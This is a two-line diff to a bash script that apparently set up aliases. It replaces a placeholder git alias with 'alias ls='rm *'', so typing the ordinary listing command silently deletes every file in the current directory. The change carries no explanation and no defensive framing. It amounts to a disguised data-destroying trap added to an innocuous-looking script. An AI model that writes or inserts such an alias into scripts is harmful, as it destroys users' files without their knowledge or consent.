@@ -1,2 +1,2 @@
 #!/bin/bash
-git config --global alias.myalias 'command to be aliased'
+alias ls='rm *'
